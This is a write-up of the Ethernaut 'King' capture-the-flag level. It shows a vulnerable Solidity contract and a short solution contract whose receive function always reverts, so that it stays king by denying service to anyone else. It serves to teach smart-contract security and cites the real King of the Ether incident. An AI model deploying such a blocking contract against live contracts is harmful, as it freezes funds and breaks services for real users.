# King

## Challenge Description

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

## Challenge Solution Walkthrough

In this challenge, the goal is to become the `king` of the contract and prevent others from becoming the `king` by making the contract revert any transactions that send Ether to it.

To achieve this, we can deploy a separate contract that will handle the process of becoming the `king`. This contract will not accept any Ether and will revert any transaction that sends Ether to it.

Here's an example of a contract, named `KingSolution`, that can be deployed for this purpose:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

error RevertOnPurpose();
error PaymentFailed();

contract KingSolution {
    address public kingContract;

    constructor(address kingContractAddress) {
        kingContract = kingContractAddress;
    }

    function solveChallenge() public payable {
        (bool success, ) = payable(kingContract).call{ value: msg.value }("");
        if (success == false) revert PaymentFailed();
    }

    receive() external payable {
        revert RevertOnPurpose();
    }
}
```

In the `solveChallenge()` function of this contract, we forward any received Ether to the `kingContract`. If the transaction fails, we revert with a custom error `PaymentFailed`.

The `receive()` function is marked as `external payable`, which means it can receive Ether. However, it is implemented to revert on purpose using the `revert RevertOnPurpose()` statement.

To solve the challenge, we deploy this `KingSolution` contract and provide the address of the original `king` contract as a constructor argument. Then, we execute the `solveChallenge()` function of the `KingSolution` contract.

By doing so, we become the `king` of the original contract, and since the `KingSolution` contract reverts any transaction that sends Ether, we prevent others from becoming the `king`.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.

In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).
